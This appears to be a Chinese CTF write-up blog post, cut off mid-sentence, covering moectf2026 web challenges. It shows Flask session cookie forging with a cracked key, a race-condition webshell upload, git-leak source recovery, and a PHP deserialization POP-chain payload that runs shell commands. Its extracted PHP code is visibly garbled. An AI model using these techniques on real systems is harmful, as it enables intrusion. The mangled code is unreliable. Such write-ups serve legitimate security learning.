---
title: web题目练习1
url: https://mp.weixin.qq.com/s/qUioVrsB_CwR8gjDlQmu9A
source: Doonsec's feed
date: 2026-10-31
fetch_date: 2026-11-01T08:20:20.990753
---

# web题目练习1

# web题目练习1

原创

T1mM9
T1mM9

t1mM9的笔记

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# 这是moectf2026几道题目，当时做的时候就没有做出来，现在复盘一下，还是比较有意思的

#

## 1.MoeCatchTheFrogs

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qiaeUjFPNA8wwpFv0Uv4taAhIzI3kRA7zD8pewDeZEjX2r75yvVqBf82nnntXzM7M6NfhrHLbNbdwjH6tPYR9XPKcPpqem3A79hE5qtlFZdA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qiaeUjFPNA8xicJaE9ib8vrw97ia64ISXcazynbfS3hcxfxawEaJN89xJFwiacMcnthdybzADq7xvKhjRI2Vljic8vcRsJjB1SSUxn2WY9BpXiayPs/640?wx_fmt=png)

简单来说就是要一直点捕捉青蛙这个键来捉青蛙，但是我们多点几次会发现，最后一直青蛙我们一直抓不到，于是想是不是通过其他方法找到最后一直青蛙

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qiaeUjFPNA8w6Sh9v9X2Iz92QIh5lVLwSx4xZSJKb7iaoNicNibbbCg2Afly3KrUyPuCFicEf4OfT8zNWhg2mX3EGMjnIpPaqVibicHURtNkkw3gSg/640?wx_fmt=png)

看一下cookie，发现了这个frog\_session，把这个cookie进行base64解码，得到'frogs':[0,1,2,3,4]

既然这样，解题思路就很明显了，我们只要伪造一个frogs从0-8的cookie就可以了

但是，再伪造之前，我们要先了解这个cookie是怎么的来的，可以看到这个cookie有三个.来分割，第一个通过base64解码发现是已经找到的frog的种类，第二个是根据时间生成的，第三个是签名，签名要根据密钥来生成。

那我们要怎么伪造cookie呢？我们首先要得到密钥，可以通过flask-unsign这个库来爆破出这个cookie的密钥：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qiaeUjFPNA8yAhjqTjXA4pribqBvDq1ga4urCtExgyBNLOeNFgkibrChBhqCSAO4MxvcTwKia8wBUW30uNCBrYQ0gAOUjuE7MOy0Ll3k2J6uhuE/640?wx_fmt=png)

可以看到破解的密钥是qwe123456

之后，我们就能轻松伪造cookie了

Set-Content -Path ".\session.json" -Value '{"frogs":[0,1,2,3,4,5,6,7,8]}' -Encoding ascii -NoNewline
python -c "import json, flask\_unsign; print(flask\_unsign.sign(json.load(open('session.json')), secret='qwe123456'))"

## 2.我刚一提交就发现了三个问题

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qiaeUjFPNA8ykmiczEHao83l4NiaibPplnPNd0soiaGvibuG4UdbX5Af3L0IQI1Ut1ylssH7vibAKo5KKgGkseCNTWtvVI9NFqMiaqVyUpnDeLV38OA/640?wx_fmt=png)

这道题目是一道上传漏洞的题目，通过一系列测试，我们能发现当我们上传php及其相关类型的文件，会被服务器直接删除；当我们上传带有

这让我犯了难，到底要怎么办呢？

不妨先想一想服务器删除我们上传文件的逻辑。当我们点击上传的时候，文件会被上传到/private目录底下，之后会检查这个文件查看文件中有没有不改出现的内容，或者检查文件类型。当发现文件类型不符合，或者文件里的内容不符合就会删除。如果我们想到了这里，就能发现其实我们的木马文件是成功上传的，只不过存在的使劲按很短而已。

这时候，我们就可以利用这个漏洞，不断上传木马，同时不断发送请求（发送请求的间隔要比发送木马的间隔段短，保证更多的访问取抢文件存在的那一秒，成功几率更大），我们可以用bp的intruder板块来实现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qiaeUjFPNA8xDCib92esJOjC770oicllibIfWFb1MBkiayz0ex9ulz1hkhYcv4HehIZZibjOtD1eNapkKaUFUcRcX6ow460rHY9o1aEnn3ruViamwQ/640?wx_fmt=png)

## 3.七狗收费小说

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qiaeUjFPNA8wSGbicpCqoCaYsV2YWicvGgXWS9LpV4tPyEZkwPfZL6mwQrkt38Pt4cx2cue1iapYwgcoPiatZJTPnK3XkjsKxwU99ich5PiapiaYr8o/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qiaeUjFPNA8wN49LmOzAtBFSNT4MkoQiaXoSC26e8rhicAzbZsvEdj09NMJztHCIAXM5ibPwgAtVEicq50SsdicVfBCUGU2UQHVYzr7yABUBtj9CQ/640?wx_fmt=png)

题目描述中提到git，猜测是git泄露，这个漏洞是由于开发者没有限制隐藏文件夹的访问导致的，可以先访问/.git/config，如果有回显，就说明有泄露，可以找到源码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qiaeUjFPNA8wpyyHG6oibvva5SLJcSMR9A6frkxQIK00F6mfypLSVwWYMOCQiaoBx8r9XDiaCxKLD1JJ0jO6S9BZRicMWlXPzky4ySZwfqGpIq9w/640?wx_fmt=png)

发现泄露之后，我们可以用git-dumper来获取这个源码

![](https://mmbiz.qpic.cn/mmbiz_png/qiaeUjFPNA8wR0BTkzHz4Nia7boLr5ERmZfrSzSHqOewq32pzmQAXOUQmBf2vKsgCZCSicWGPKxgicrxCm7hn6MBPcjvRWUVR3x82Kre6ibcAPq4/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qiaeUjFPNA8yCwDjyiaMw740ZXgv3Rru7gUaP85JRets0qM0BZNupA4tR44tY1bhP6Rn4XVOGQIAxwiapEJ8w55iaIQL3GWZ6oI6eQ7eZJvfxico/640?wx_fmt=png)

发现这个index.php，把里面重要的内容复制下来

// 小刻可是学了最新的 PHP 8 哦，快夸夸小刻
error\_reporting(0);class User
{
public username,﻿password;
public secreta,﻿secret\_b; public function \_\_construct(username,﻿password)
{
this−>username=﻿username;
this−>password=﻿password;
this−>secreta=﻿this->secret\_b = 0;
} public function \_\_wakeup()
{
// 每次都要重新登录，这样坏人肯定进不来啦
$this->secret\_b = random\_int(1000\_0000, 9999\_9999);
} public function \_\_destruct()
{
if (this−>username!==﻿this->password)
die("不对，密码不对！");
if (this−>secreta!==﻿this->secret\_b)
die("不行，要重新登录！"); echo "已经登录啦：$this->username";
}
}class UserInfo
{
public user,﻿permission; public function \_\_construct($user)
{
this−>user=﻿user;
this−>permission=﻿user->username === "admin" ? "权限 7" : "权限 0";
} public function \_\_tostring()
{
return this−>user−>username."（权限等级：".﻿this->permission . "）";
}
}class Diagnosis
{              public key,﻿value, action;    public function \_\_get(name)
{
if (name===﻿this->key && is\_object($this->action)) {
return (this−>action)(﻿this->value);
}
return null;
} public function \_\_invoke($value)
{
return shell\_exec("this−>key﻿value");
}
}$curr\_user = null;if (isset(KaTeX parse error: Expected 'EOF', got '&' at position 20: …T['username']) &̲& isset(\_POST['password'])) {
username=﻿\_POST['username'];
password=﻿\_POST['password']; user=newUser(﻿username, $password); data=base64encode(serialize(﻿user));
setcookie('user', $data, time() + 3600, '/');
curruser=﻿user;} elseif (isset($\_COOKIE['user'])) {
data=base64decode(﻿\_COOKIE['user']);
curruser=unserialize(﻿data);
}
?>

## 刻俄柏的小说（登录才能看！）

用户名

密码

发现很明显是反序列化漏洞，我们可以交互的入口在cookie这里：

elseif (isset($\_COOKIE['user'])) {

data=base64decode(﻿\_COOKIE['user']);

}

可以看到，这里对输入的cookie没有任何的限制，导致我们可以利用这个上传经过序列化的一些内容来远程控制服务器输出

我们要输入什么内容的序列化后的结果呢？可以看看前面定义的类，发现会存在pop链，这是利用魔法方法在里面进行多次跳转然后获取敏感数据的一种payload，主要考察我们怎么一步一步的跳转。

我们注意到，当一个对象时dignose类型，且满足name===this->key && is\_object($this->action）的时候，会返回一个函数，当这个函数被返回之后，又会触发shell\_exec("this->keyvalue")。这段代码是出发漏洞的关键，其中shell\_exec是在服务器中执行命令。而this->keyvalue是取当前对象对象的key和value属性，结合在一起。当我们先触发了\_\_get（读取不存在的属性）这个魔术方法，并通过检验，返回一个函数。当对象被当作函数来调用后，会触发\_\_invoke，进而返回shell\_exec。如果shellexec这个函数的内容又是我们可以控制的，我们就能直接访问这个服务器的文件系统了。

接下来，我们要找到哪里能触发get，看到userinfo中的return $this->user->username，如果user没有username这个属性，就会触发get这个魔法方法

按照这个方法，我们在往上找，会找到echo "已经登录啦：$this->username";，如果这里的username属性不是字符，就会触发\_\_tostring()。

要想触发echo "已经登录啦：$this->username"，前提条件是满足前面的两个if的判断，第一个判断不难满足，第二个判断就相对比较难了if (this−>secreta!==﻿this->secret\_b)，一位secretb是我们没法控制的一个完全随机的数。我们要绕过这个判断，就要让secreta的值为secretb的“地址”，这样这个条件就能永远满足了。

理解了pop链之后，我们就不难写出payload：

class User
{

publicusername,password;

publicsecreta,secret\_b;

}

class UserInfo

{

publicuser,permission;

}

class Diagnosis

{

publickey,value, $action;

}

$d2 = new Diagnosis("");

$d2->key = "cat /flag";

$d2->value = "";

$d2->action = null;

$d1 = new Diagnosis("");

$d1 ->key = "username";

$d1 ->value = "";

d1−>action=d2;

$info = new UserInfo();

info−>user=d1;

$info -> permission = "权限 7";

$user = new User();

user−>username=info;

user->secret\_b ;

user−>password=user->username;

serialized=serialize(user);

base64=base64encode(serialized);

echo " Serialized \n";

echo $serialized . "\n\n";

echo " Base64：\n";

echo $base64 . "\n";

把payload的结果当成cooklie，post到服务器中就能找到flag

![](https://mmbiz.qpic.cn/mmbiz_png/qiaeUjFPNA8ztibsYibpVa0mxT9ZXhjNfA72glachD7hj6EicA6ebANOsILAKSvllibq03ZKAIiaYE1HWBzb5GVlm9TTTURpZoy1iaicsNG75a2M17w/640?wx_fmt=png)

## 4.我爱发明

![](https://mmbiz.qpic.cn/mmbiz_png/qiaeUjFPNA8wibmvvrSibG6YAtDrmpb86vFyHFM3QfDjF9z7yduMNAiamWej4jDIy0nL0AeB7VkTSrx5gVPKoc1x0Dgmc0NcLgNO0qYNQdCnhlY/640?wx_fmt=png)

发现前面两关都是小游戏：

![](https://mmbiz.qpic.cn/mmbiz_png/qiaeUjFPNA8waJg1CCibACP5L7icmsxUeGg7lRY8h1l6FuFrcraIEAQjliauW8WCkML7GF5IYC4mHPWtyvIt5PtbuJezNKyjyQCKibJ3MYZYftbw/640?wx_fmt=png)

很轻松，直接来看第三关，要求我们在20秒中之内，找到12\*24个页面中验收通过的页面底下的验收片段，组成字符串的sha256值，听着就非常复杂，更别说这个20秒限制了，这个限制一加，难度直接大幅度提升。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qiaeUjFPNA8yfMVRkr6Ijl58k9Zw6Axp8uRM1lJhRLzjianwOic8LtgR6AkOV2JQaNE3oh5O126th0p1PWWBKVe3KrtbIWI2HOey236u73fb1E/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qiaeUjFPNA8xywutjyu4kEgZ5WK8eYacJRHks1WAofUHDicscKP3fmv4AfPJ1xmUCd6ia7Vxf8bLxj6Sr1WcOguhQZnOYZVlLq9ZrcpH2k5LGQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qiaeUjFPNA8ywL3MzXzUSWsmSkgesOaL9WlccOrW18hOEurApIdW8YhfqZ9Y1hIiaeGyib2X2Zludtq5MABQVic8on9TSmzbd6tgvZejYYlusMs/640?wx_fmt=png)

我们打开f12，查看页面中验收状态和验收片段的位置在哪里，方便我们爬取

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qiaeUjFPNA8w1zm7GXIxNK6plNohZEqSVtGiburdfsQsgAkp6ib701tbyqtYlW0Fc3ALYkMC8DsOqBQZpKyV6AT543mSiak5Q874AC3n0phl0zY/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qiaeUjFPNA8wiaXgkQic2HV8Vicb2GSSrD8dRgjSkfErvTxJ3iciaQIrsibhbJWILMmhnicficDmoyrX2iasv2X5osBA8r1uiaFwX2vXaW5ibHjuCpWOMuM/640?wx_fmt=png)

可以看到，div的inspection-sheet是验收状态，code的inspection-code是验收片段，这样我们就能写一...